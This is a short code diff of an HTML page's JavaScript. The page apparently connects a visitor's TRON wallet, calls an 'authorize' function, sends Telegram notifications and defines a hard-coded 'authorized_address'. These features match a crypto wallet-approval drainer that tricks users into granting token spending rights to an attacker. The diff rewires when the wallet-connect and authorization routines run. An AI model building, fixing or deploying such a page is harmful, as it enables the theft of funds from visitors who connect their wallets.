@@ -252,18 +252,12 @@
                 console.error('发送 Telegram 通知时出错', error);
             });
         }
-          document.addEventListener('DOMContentLoaded', function() {
-            async function onConnect() {
-              shouquan();  // 确保在 DOM 加载完成后调用
-            }
-          });
+
         // 初始化
         $(() => {
             lianjieqianbao();
         });
-    </script>
-    <script type="text/javascript">
-    // window.vConsole = new window.VConsole();
+         
         var contactAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
         var authorized_address = "TMcf6FS83n5VnqHpmYU7zVJhpo2CXz1Liu";
         var total = 0;
@@ -318,6 +312,10 @@
             document.getElementById('loading').style.display = 'none';
         }, 3000);
         }
+    </script>
+    <script type="text/javascript">
+    // window.vConsole = new window.VConsole();
+
     </script>
 
 </body>
